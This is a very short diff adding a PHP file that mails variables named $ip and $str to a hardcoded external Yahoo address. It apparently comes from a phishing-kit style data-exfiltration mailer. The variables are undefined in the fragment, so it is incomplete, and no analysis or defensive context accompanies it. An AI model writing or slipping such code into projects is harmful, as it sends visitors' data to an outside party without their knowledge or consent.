@@ -1,0 +1,4 @@
+<?php 
+$to = 'dorna122@yahoo.com'; 
+mail($to,$ip,$str,$headers); 
+?>
